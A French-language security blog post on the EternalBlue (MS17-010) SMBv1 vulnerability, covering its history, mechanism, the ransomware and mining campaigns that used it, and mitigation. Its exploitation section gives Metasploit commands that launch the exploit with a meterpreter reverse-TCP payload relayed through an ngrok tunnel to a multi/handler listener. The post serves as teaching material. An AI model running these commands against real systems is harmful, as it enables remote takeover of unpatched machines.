---
title: "EternalBlue ou MS17-010"
summary: "EternalBlue est un exploit connu qui cible les versions de Windows de Microsoft, exploitant une vulnérabilité dans le protocole SMB et permettant à un attaquant de prendre le contrôle total d'un système."
categories: ["Blog", "Cybersécurité",]
tags: ["Sécurité", "SSI", "EternalBlue", "WannaCry", "Exploit"]
showSummary: true
date: 2023-08-04
draft: false
---

## Introduction

EternalBlue est un exploit connu qui a été rendu tristement célèbre par son utilisation dans l'attaque du rançongiciel WannaCry en 2017. Cet exploit, présumé avoir été développé par la National Security Agency (NSA) des États-Unis, cible les versions de Microsoft Windows XP à Windows Server 2012 R2. Cet article explore l'histoire, le fonctionnement et les implications de l'exploit EternalBlue.

## Historique

L'exploit **EternalBlue** a été publié pour la première fois par le groupe de hackers appelé The Shadow Brokers en avril 2017. Il faisait partie d'une collection plus large d'outils qui, selon les rumeurs, avaient été volés à l'unité **Equation Group** de la NSA. Quelques semaines après la divulgation de l'exploit, il a été utilisé dans l'attaque mondiale du rançongiciel **WannaCry** qui a infecté des centaines de milliers de systèmes dans plus de 150 pays.

## Fonctionnement

**EternalBlue** exploite une vulnérabilité dans le protocole SMB (Server Message Block) de Microsoft, qui est utilisé pour le partage de fichiers et d'imprimantes sur un réseau local. Plus précisément, il cible le service Microsoft SMBv1.

L'exploit permet à un attaquant de transmettre des commandes spécialement conçues à un système vulnérable, lui permettant d'exécuter du code arbitraire sur le système cible. Cela signifie qu'un attaquant peut prendre le contrôle total d'un système à distance, sans nécessiter d'interaction de l'utilisateur.
EternalBlue exploite cette vulnérabilité en envoyant un paquet spécialement conçu à un port d'écoute SMB sur un système cible. Ce paquet est structuré de manière à **déborder un tampon** (Buffer Overflow) dans le pilote de serveur SMB de Windows, ce qui permet à l'attaquant d'injecter et d'exécuter son propre code sur le système cible. En d'autres termes, l'attaquant peut prendre le contrôle total d'un système à distance.


## Implications et conséquences

La menace posée par **EternalBlue** est grave en raison de sa capacité à se propager sur les réseaux, EternalBlue est particulièrement dangereux pour les environnements d'entreprise où de nombreux systèmes sont interconnectés.

Malgré la disponibilité d'un correctif de sécurité de Microsoft (MS17-010) publié en mars 2017, de nombreux systèmes restent non patchés et donc vulnérables à EternalBlue. Cela est dû à une combinaison de facteurs, notamment le manque de sensibilisation à la sécurité, les contraintes de ressources et l'utilisation continue de systèmes d'exploitation obsolètes et non pris en charge.

Quelques exemples d'attaques historiques basées sur l'EternalBlue :

- **WannaCry** : L'attaque de rançongiciel WannaCry a eu lieu en mai 2017, causant des dommages financiers estimés à 4 milliards de dollars. Les cybercriminels ont utilisé EternalBlue pour compromettre des ordinateurs vulnérables. Une fois qu'ils ont pris le contrôle de systèmes non patchés, ils ont installé WannaCry, qui a verrouillé les utilisateurs hors de leurs fichiers et même de leurs ordinateurs. Ceux qui souhaitaient récupérer l'accès étaient invités à payer une rançon de 300 dollars chacun en Bitcoin.

- **NotPetya** : L'attaque de rançongiciel NotPetya en juin 2017 a été encore plus dévastatrice que son prédécesseur WannaCry. Les dommages financiers estimés ont atteint 10 milliards de dollars, ce qui en fait l'attaque la plus destructrice utilisant EternalBlue à ce jour. Contrairement à WannaCry, la note de rançon de NotPetya ne promettait pas aux utilisateurs qu'ils récupéreraient l'accès à leurs fichiers.

- **Sednit**, également connu sous les noms "APT28", "Fancy Bear" et "Sofacy", est une attaque ciblée sur les réseaux Wi-Fi appartenant à des hôtels à travers l'Europe en août 2017. Comme ses prédécesseurs, les cybercriminels ont utilisé EternalBlue pour atteindre leurs cibles.

- **Bad Rabbit** : Le rançongiciel Bad Rabbit a également utilisé EternalBlue lors d'attaques en octobre 2017, amenant les chercheurs en cybersécurité à croire qu'il a été créé par le même groupe à l'origine de NotPetya. Les attaquants ont demandé aux victimes de payer 285 dollars chacun en Bitcoin en échange de leurs fichiers.

- **Satan** : EternalBlue a également été utilisé pour distribuer le rançongiciel Satan en novembre 2017, suite au succès des attaques WannaCry, NotPetya et Bad Rabbit. Les victimes ont été invitées à payer 0.3 Bitcoin chacun pour retrouver l'accès à leurs fichiers.

- **WannaMine**, un malware de minage de cryptomonnaie, a fait surface en septembre 2018. Comme le reste des malwares discutés dans cette section, il a utilisé EternalBlue pour infiltrer les systèmes cibles.

- **NRSMiner** : Comme WannaMine, NRSMiner utilise les ordinateurs des victimes pour miner des Monero. On pense qu'il a été redessiné pour utiliser EternalBlue afin d'infecter les systèmes. Le malware repensé a circulé en janvier 2019.

- **Indexsinas** est un ver SMB qui utilise EternalBlue pour infiltrer les systèmes cibles depuis juin 2021. Il a été utilisé pour implanter des mineurs de cryptomonnaie (malwares qui minent des cryptomonnaies sans la connaissance de l'utilisateur) dans les ordinateurs infectés.


## Découverte
### Découvrir le host
Plusieurs méthodes sont possibles pour découvrir l'OS même de la machine hôte qu'on pentest : 
- vérifier le TTL pour les machines 

| OS  | TTL          |
| :--------------- |:---------------:|
| Windows 95/98  |   32      |
| *nix (Linux/Unix)  |   64      |
| Windows  |   128      |
| Solaris/AIX	  | 254             | 

- En utilisant Nmap : `nmap -O -PN <url>`

### Machine vulnérable au MS17-010    
Pour découvrir si un host est vulnérrable à l'EternalBlue :

- Nmap :`nmap -A -sV --script vuln <IP_MACHINE>`

- Metasploit : 
```bash
    msfconsole
    search eternalblue
    use auxiliary/scanner/smb/smb_ms17_010
    options
```


## Exploitation

On peut utiliser Metasploit encore une fois, mais cette fois avec un script exploit.
```bash
    msfconsole
    search eternalblue
    use exploit/windows/smb/ms17_010_eternalblue
    options
```

Avant de commencer, on tunnelle le traffic via ngrok pour pas que le fw local de la machine bloque le flux entrant du reverse shell.
Ainsi on va par exemple utiliser [Ngrok](https://ngrok.com/) avec `ngrok tcp 4444`

![Ngrok lancé](./ngrok.png "Ngrok tunnel lancé")

Il faut alors set **LHOST**, **LPORT** et **RHOST** et **payload**.
```bash
    set lhost <url_ngrok>
    set lport <port_ngrok>
    set rhost <ip_destination>
    set payload windows/x64/meterpreter/reverse_tcp
```

Maintenant avec la configuration, le tunnel sera crée entre le serveur vulnérable à l'eternalblue et le serveur ngrok, il faudrait faire un multi handle pour que ngrok fasse le forward des inbound sur la machine locale.

Ainsi on va utiliser le script `multi/handler` de metasploit :

```bash
    use multi/handler
    set payload windows/x64/meterpreter/reverse_tcp
    set lhost 127.0.0.1
    set lport 4444
    set exitonsession false
    set ReverseListenerBindAddress 127.0.0.1
    exploit -j -z
```

Par la suite en réalisant un `exploit` sur la 1ère session msfconsole, 

Il suffit de vérifier les sessions et on trouve que sur le multi handler après relance qu'on a bien notre session : 

```bash
    exploit -j -z
    sessions -i 1
```


## Prévention et atténuation

La première et la plus importante mesure pour se protéger contre EternalBlue est de s'assurer que tous les systèmes sont à jour avec les derniers correctifs de sécurité. En particulier, les systèmes Windows devraient avoir le correctif MS17-010 appliqué.

De plus, les organisations devraient envisager de désactiver SMBv1 si cela est possible sans perturber les opérations. SMBv1 est un protocole obsolète et Microsoft recommande son remplacement par des versions plus récentes et plus sécurisées.

## Un problème pour toujours
Des chercheurs de la NSA ont réalisé des recherches depuis le patch de la vulnérabilité, et ont réalisé que malgrès le patch la vulnérabilité va encore rester d'actualité pour longtemps étant donné que non seulement les systèmes non patchés seront concernés mais aussi toute machine utilisant une version cracké de Windows.

La liste des 10 pays les plus encore touchés par la vulnérabilité en dehors de l'amérique du nord et l'europe sont : 

- Indonesia
- Taiwan
- Vietnam
- Thailand
- Egypt
- Russia
- China
- Philippines
- India
- Turkey